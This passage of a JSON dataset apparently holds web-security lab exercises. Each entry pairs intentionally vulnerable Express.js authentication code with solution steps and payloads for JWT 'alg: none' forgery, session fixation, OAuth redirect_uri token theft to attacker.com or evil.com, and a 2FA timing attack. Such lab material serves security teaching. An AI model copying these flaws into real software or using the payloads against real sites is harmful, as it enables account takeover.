    "Lab Description": "The API uses JWT tokens for user authorization. However, it trusts the 'alg' header in incoming tokens, enabling algorithm confusion attacks. The application accepts tokens signed with 'none' algorithm, bypassing signature validation. To solve: Forge a token granting admin access and retrieve the admin panel contents.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a legitimate JWT issued to a normal user during login via the /api/login endpoint.",
      "Inspect the JWT structure in jwt.io and observe the use of HS256 algorithm.",
      "Modify the 'alg' field to 'none' and set the 'role' claim to 'admin', leaving the signature section blank.",
      "Send the tampered JWT as a Bearer token in an Authorization header to the /api/admin route.",
      "Verify successful access to the admin panel, indicating bypass of token signature verification."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/api/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome to the admin panel'); } else { try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Welcome to the admin panel'); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(403).send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via unrotated session cookie after login",
    "Lab Description": "The web application issues a session cookie to all visitors, including unauthenticated ones. However, it fails to rotate the session cookie upon successful login. This enables a session fixation attack. To solve: Fixate Carlos’s session cookie prior to login and hijack his session after authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET request to /login and capture the unauthenticated session cookie.",
      "Send Carlos a crafted phishing link embedding the session ID via query string or manipulate the browser via XSS/social engineering.",
      "Wait until Carlos logs in using the pre-fixed session.",
      "Use the same session ID to access /my-account while impersonating Carlos.",
      "Verify access to Carlos's account with no re-authentication required."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { loggedIn: false }; res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\">Username:<input name=\"username\">Password:<input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].user = username; return res.redirect('/my-account'); } res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].loggedIn) return res.send(`Welcome ${sessions[sid].user}`); res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on port ${PORT}`));",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: sid=attackerfixedsessionid",
      "sid=attackerfixedsessionid in phishing email redirect",
      "Cookie replay: sid=attackerfixedsessionid"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect and auto approval",
    "Lab Description": "The application implements OAuth with a third-party identity provider but fails to validate the 'redirect_uri' parameter and automatically grants access tokens. This misconfiguration enables attackers to steal tokens via malicious redirects. To solve: Craft a malicious URL to capture Carlos’s OAuth token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect the /oauth/authorize endpoint parameters using Burp Suite and note the presence of redirect_uri, response_type, and client_id.",
      "Observe that the redirect_uri can be modified to external domains.",
      "Craft a URL using the known client_id and a malicious redirect_uri pointing to your server.",
      "Trick Carlos into clicking the link (e.g., via social engineering).",
      "Capture the access token appended in the redirect_uri and use it to call /api/userinfo.",
      "Validate that the token grants access to Carlos's profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { carlos: 'abc123xyz' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = tokens['carlos']; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; return res.redirect(uri); } res.status(400).send('Invalid request'); }); app.get('/api/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'abc123xyz') return res.send({ username: 'carlos', email: 'carlos@example.com' }); res.status(403).send('Forbidden'); }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on port ${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?response_type=token&client_id=trusted-app&redirect_uri=https://attacker.com/capture",
      "https://attacker.com/capture#access_token=abc123xyz",
      "Authorization: Bearer abc123xyz"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token validation logic",
    "Lab Description": "The application uses JWTs to maintain session state but fails to validate the token's algorithm correctly. The backend blindly trusts the `alg` field in the token header. The application accepts unsigned tokens when the `alg` is set to `none`. To solve: Forge a valid token to access Carlos's account without knowing his password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept a valid JWT token using Burp Suite after logging into your own account.",
      "2. Modify the JWT header to set 'alg' to 'none' and remove the signature section.",
      "3. Modify the payload to set the 'username' claim to 'carlos'.",
      "4. Encode the header and payload in base64url format and concatenate with a period, omitting the signature.",
      "5. Use Postman to send a request to /my-account with the forged token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', role: 'admin' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session token in login flow",
    "Lab Description": "The application generates session IDs before authentication and does not invalidate them after login. A malicious user can set a known session ID, get the victim to use it, then hijack the session after they log in. To solve: Log in as Carlos by setting and reusing a fixed session cookie.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp to send a GET request to the login page and intercept the Set-Cookie response header.",
      "2. Manually set the session cookie in your browser to 'session=attackersessionid'.",
      "3. Send the crafted login link with the session cookie pre-set to Carlos.",
      "4. Once Carlos logs in using the attacker's session, revisit /my-account with the same session cookie.",
      "5. Confirm session takeover and access the account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/login', (req, res) => { const sid = req.cookies.session || 'guest-' + Math.random().toString(36).substr(2); res.cookie('session', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account: ${user}`); else res.send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "session=attackersessionid",
      "GET /login HTTP/1.1 with Set-Cookie: session=attackersessionid",
      "GET /my-account HTTP/1.1 with Cookie: session=attackersessionid"
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant misconfiguration leaking access token via referer",
    "Lab Description": "The app implements OAuth using the implicit flow, but includes a third-party analytics script that logs full Referer headers. Since access tokens are returned in the URL fragment, these tokens leak to third-party domains. To solve: Capture Carlos's leaked access token and use it to access his account data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to proxy OAuth login flow and observe the redirect URL fragment.",
      "2. Capture a valid access_token value from the browser's redirect to /oauth/callback.",
      "3. Check the Referer header sent to a third-party script and extract the token from HTTP history.",
      "4. Replay the token in Postman using the Authorization: Bearer header against /api/account.",
      "5. Verify account data of Carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.access_token; res.send(`<script src='https://third-party.io/track.js'></script><h1>Logged in</h1>`); }); app.get('/api/account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; if (auth === 'valid-oauth-token-for-carlos') { res.send('Account data for carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "Authorization: Bearer valid-oauth-token-for-carlos",
      "GET /api/account HTTP/1.1 with leaked token",
      "https://example.com/oauth/callback#access_token=valid-oauth-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in REST login API",
    "Lab Description": "This lab’s login functionality accepts JWTs for authentication but fails to enforce proper algorithm validation. The application trusts tokens signed with 'none' algorithm. To solve: forge a JWT token impersonating the user 'carlos' and access their profile page via /api/profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /api/login with Burp Suite and extract the JWT returned in the Set-Cookie header.",
      "Decode the token using jwt.io or a similar tool and observe the 'alg' header.",
      "Modify the JWT header to use 'alg':'none' and remove the signature.",
      "Modify the payload to {\"user\":\"carlos\"} and re-encode the JWT using base64url.",
      "Send a GET /api/profile request with the forged JWT in the Authorization: Bearer header and confirm Carlos’s data is returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: username }, 'supersecret'); res.cookie('auth', token); res.send('Logged in'); }); app.get('/api/profile', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { res.send(`Welcome ${payload.payload.user}`); return; } try { const verified = jwt.verify(token, 'supersecret'); res.send(`Welcome ${verified.user}`); } catch (e) { res.status(403).send('Invalid'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer [none-algorithm-jwt]"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth login flow",
    "Lab Description": "This lab is vulnerable to session fixation during OAuth-based third-party login. The application fails to issue a new session token post-authentication. To solve: authenticate as yourself, fix a session ID, and force the victim (Carlos) to reuse the session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to capture your login request via the OAuth flow and record the session cookie.",
      "Send the fixed session cookie to a victim via phishing or iframe auto-GET with document.cookie injection.",
      "Simulate Carlos logging in by issuing a GET /auth/callback request with the fixed session.",
      "Observe that Carlos inherits your session and gets logged into the attacker session.",
      "Access /account using the fixed session and confirm Carlos's details are exposed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); const users = { 'carlos': {}, 'attacker': {} }; app.get('/login', (req, res) => { const sessionID = req.sessionID; res.redirect(`/auth?state=${sessionID}`); }); app.get('/auth/callback', (req, res) => { const sessionID = req.query.state; req.session.id = sessionID; req.session.user = 'carlos'; res.send('Logged in via OAuth'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Account data for ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /auth/callback?state=[attacker-session-id]",
      "Set-Cookie: connect.sid=[fixed-session-id]"
    ]
  },
  {
    "Lab scenario": "Blind 2FA brute-force with timing side-channel",
    "Lab Description": "The 2FA mechanism leaks processing time differences for valid codes. The backend takes longer to process correct digits. To solve: use timing analysis to brute-force Carlos's 6-digit 2FA code and access his account via /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in as Carlos with correct username and password using Burp Suite or Postman.",
      "Send multiple POST /verify requests with different 2FA codes and measure response times using Burp Logger++ or Python’s time module.",
      "Identify the correct digits one-by-one based on increased response delay.",
      "Automate the timing attack using a custom script to determine the full 6-digit code.",
      "Submit the correct code to complete login and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'p4ssword', code: '492138' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); req.session = { username }; res.redirect('/2fa'); }); app.post('/verify', (req, res) => { const { username, code } = req.body; const user = users.find(u => u.username === username); for (let i = 0; i < code.length; i++) { if (user.code[i] !== code[i]) return res.status(403).send('Denied'); sleep(100); } res.send('2FA Passed'); }); function sleep(ms) { const start = Date.now(); while (Date.now() - start < ms); } app.get('/my-account', (req, res) => { if (req.session && req.session.username === 'carlos') res.send('Carlos account data'); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
    "payloads": [
      "POST /verify with code=4xxxxx",
      "POST /verify with code=49xxxx",
      "POST /verify with code=4921xx",
      "POST /verify with code=492138"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm tampering in API auth header",
    "Lab Description": "The API uses JWT-based authentication for sensitive endpoints but fails to validate the algorithm used. The application decodes and accepts tokens with `alg: none` without proper signature verification. To solve: Forge a valid JWT that grants admin privileges and access the protected /admin/report endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to observe a valid JWT issued after login and note the algorithm and claims.",
      "Copy the token and decode it using jwt.io. Confirm that `alg` is set to `HS256` or similar.",
      "Manually change the JWT header to `{ \"alg\": \"none\" }` and payload to `{ \"role\": \"admin\" }`.",
      "Remove the signature part entirely and send the manipulated JWT in the Authorization header using Burp Repeater.",
      "Confirm admin access by receiving a 200 OK response and viewing the report data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } else { jwt.verify(token, SECRET); const decoded = jwt.decode(token); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } res.status(403).send('Access denied'); } catch (e) { res.status(500).send(e.message); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leak in redirect URI",
    "Lab Description": "The application integrates OAuth2 login using the implicit flow and allows open redirection through the `redirect_uri` parameter. The access token is leaked via URL fragment and reflected in the redirect. To solve: Intercept the OAuth flow and capture Carlos's token using a crafted redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth2 login initiation flow and identify the authorization URL with response_type=token.",
      "Modify the redirect_uri parameter to a malicious endpoint under your control (e.g., https://attacker.com/#access_token=)",
      "Send the modified link to Carlos using the comment feature on the website (assume CSRF vector or social engineering).",
      "When Carlos clicks the link, the access_token fragment will be appended to your site. Capture this with a listener or webhook.site.",
      "Replay the captured token in the Authorization header and access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': { token: 'abc123xyz', role: 'user' } }; app.get('/auth', (req, res) => { const { redirect_uri, response_type } = req.query; if (response_type === 'token') { const accessToken = 'abc123xyz'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === users['carlos'].token) return res.send('Account details for carlos'); res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=&response_type=token",
      "Authorization: Bearer abc123xyz"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session ID reuse in cookie",
    "Lab Description": "The application allows users to set their own session ID via a cookie prior to authentication. Upon login, the session ID is not regenerated. An attacker can set a known session value and trick a victim into logging in using it. To solve: Fix a session ID and use it to hijack Carlos's session after he logs in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, access the site while unauthenticated and manually add a session=attacker123 cookie in the request.",
      "Log in with your own credentials and observe that the session ID remains unchanged.",
      "Send a crafted link to Carlos that sets document.cookie = 'session=attacker123' via reflected XSS or social engineering.",
      "After Carlos logs in, reuse the session=attacker123 cookie and visit /my-account.",
      "If session fixation is successful, the response will include Carlos's account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 'secretpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'anon'; sessions[sid] = username; res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') res.send('Carlos account info'); else res.send('Not authorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=attacker123",
      "document.cookie = 'session=attacker123'",
      "POST /login with session=attacker123 then wait for Carlos to login with same session"
    ]
  },
  {
    "Lab scenario": "JWT tampering using 'alg: none' in Authorization header",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for user authentication and authorizes access via Bearer tokens. The backend relies on the JWT's `alg` field to determine signature verification. The application fails to enforce algorithm restrictions, allowing manipulation of the `alg` field to 'none' and bypassing signature verification. To solve: tamper with your JWT to impersonate the admin user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite by logging in as a regular user.",
      "Decode the token using jwt.io or Burp Decoder. Change `alg` to `none` and `sub` to `admin`.",
      "Remove the signature portion completely, then base64-encode the modified header and payload.",
      "Replace the Authorization header with the forged token in Postman or Burp Repeater.",
      "Send a GET request to /admin and confirm access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = payload.payload.sub; if (user === 'admin') return res.send('Welcome admin'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'admin') return res.send('Welcome admin'); res.status(403).send('Forbidden'); } catch { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab's login system is vulnerable to session fixation. Session IDs are accepted via URL parameters and not regenerated upon successful login. The application trusts client-supplied session tokens, enabling an attacker to set a victim's session before login. To solve: set a session token for Carlos, trick him into logging in, then reuse his session to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Generate a valid session token for yourself using /login?user=attacker.",
      "Craft a phishing URL with ?session=attacker-session-token and send it to Carlos (simulated).",
      "Carlos logs in using the provided URL. The session remains the same post-login.",
      "Use the same session token to access /my-account as Carlos.",
      "Verify that Carlos's account page is accessible with the fixed session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'qwerty123', 'attacker': 'attackpass' }; app.get('/login', (req, res) => { const { user, session } = req.query; if (users[user]) { const sess = session || Math.random().toString(36).substring(2); sessions[sess] = user; res.cookie('session', sess); res.send('Logged in'); } else { res.status(401).send('Invalid user'); } }); app.get('/my-account', (req, res) => { const sess = req.cookies.session; const user = sessions[sess]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?user=carlos&session=attack123",
      "Cookie: session=attack123",
      "GET /my-account with session=attack123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration with open redirect",
    "Lab Description": "The OAuth implementation in this app uses the implicit grant flow without validating redirect URIs correctly. The app also accepts open redirects. By chaining these issues, an attacker can steal access tokens by injecting a malicious redirect URI. To solve: steal Carlos’s OAuth token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate an OAuth login and intercept the request to /authorize using OWASP ZAP.",
      "Modify the `redirect_uri` parameter to an attacker-controlled URL with an open redirect back to your server.",
      "Host a simple HTTP listener to capture the token fragment.",
      "Send the phishing OAuth link to Carlos (simulated).",
      "Receive Carlos's token and use Postman to send an authenticated request to /profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const url = require('url'); const tokens = { 'carlos': 'token123' }; const openRedirects = ['/redirect?to=http://evil.com']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type !== 'token') return res.status(400).send('Invalid response_type'); const parsed = url.parse(redirect_uri); if (!parsed.host) return res.status(400).send('Invalid redirect URI'); const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === tokens['carlos']) return res.send('Carlos profile page'); res.status(403).send('Unauthorized'); }); const PORT = 3002; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://target.com/authorize?client_id=xyz&redirect_uri=http://evil.com/redirect?to=http://attacker.com/capture&response_type=token",
      "#access_token=token123",
      "Authorization: Bearer token123"
    ]
  },
  {
    "Lab scenario": "JWT token manipulation vulnerability in session authorization",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) to manage user sessions. However, it incorrectly validates the token signature due to the use of the 'none' algorithm. The application trusts the user-submitted token without verifying its integrity, enabling privilege escalation via token tampering. To solve: Forge a valid token that grants admin-level access and use it to access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT token using Burp Suite's Proxy feature during login.",
      "2. Decode the JWT using jwt.io and observe the algorithm is set to 'HS256'.",
      "3. Change the alg to 'none' and set the payload 'role':'admin'.",
      "4. Remove the JWT signature entirely and re-encode the header and payload.",
      "5. Replace the Authorization header with the forged token in Burp Repeater and access /admin panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username: 'admin', role: 'admin' }, 'secret'); res.json({ token }); } else { const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in cookie management",
    "Lab Description": "This lab uses a session cookie to maintain user authentication states. However, the session ID is set before login and is not regenerated upon successful authentication, allowing an attacker to fix a session for a victim before they log in. To solve: Fix a session for Carlos, make him log in, then reuse the session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the login request and observe the Set-Cookie header before authentication.",
      "2. Note the session cookie value and send Carlos a phishing link containing it (simulate via cookie replay).",
      "3. Wait for Carlos to log in (assume passive login simulation).",
      "4. Replay the session ID in a new request with Burp Repeater to access Carlos's authenticated session.",
      "5. Navigate to /my-account using the fixed session cookie to verify the exploit."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); res.cookie('session', sessionId); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/></form>'); }); app.post('/login', (req, res) => { const sessionId = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sessionId] = username; res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account details for ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Cookie: session=abc123456def789",
      "Cookie: session=fixedsessionidvalue",
      "Cookie: session=carlosSession001"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login endpoint",
    "Lab Description": "This lab uses OAuth for federated login through a third-party provider. However, the redirect URI is not strictly validated, allowing an attacker to manipulate the redirection flow and gain access to a valid session. To solve: Exploit the redirect_uri parameter to hijack a session token from the OAuth flow and log in as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate the OAuth login flow and observe the redirect_uri value.",
      "2. Modify the redirect_uri to a domain controlled by you (simulate local endpoint).",
      "3. Capture the OAuth token or code sent to your malicious redirect.",
      "4. Exchange the captured token for a session using the vulnerable /oauth/callback endpoint.",
      "5. Use the session to access /my-account as the victim user."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'fake-auth-code'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/oauth/callback', (req, res) => { const { code } = req.query; if (code === 'fake-auth-code') { res.cookie('session', 'victim-session'); res.send('OAuth login successful'); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.headers.cookie?.split('=')[1]; if (session === 'victim-session') { res.send('Welcome, OAuth user!'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "https://vulnerable.site/auth?redirect_uri=https://attacker.com/callback",
      "https://vulnerable.site/auth?redirect_uri=http://localhost:1337/hook",
      "https://vulnerable.site/auth?redirect_uri=https://example.com/oauth/exploit"
    ]
  },
  {
    "Lab scenario": "Session fixation attack in login flow",
    "Lab Description": "The session management in this application fails to regenerate session identifiers after login. The application accepts pre-set session cookies from unauthenticated users and continues to use the same session after successful login. To solve: hijack a logged-in session by fixing the session token prior to user authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request while unauthenticated and note the session cookie issued.",
      "2. Send a phishing link with your pre-issued session ID as a query parameter to the victim.",
      "3. The victim clicks the link, logs in, and reuses your session ID, which is not regenerated after login.",
      "4. Use the same session ID in your browser and navigate to /account.",
      "5. Verify you have access to the victim’s session by confirming the displayed username."
    ],
    "Vulnerability name": "Authentication",
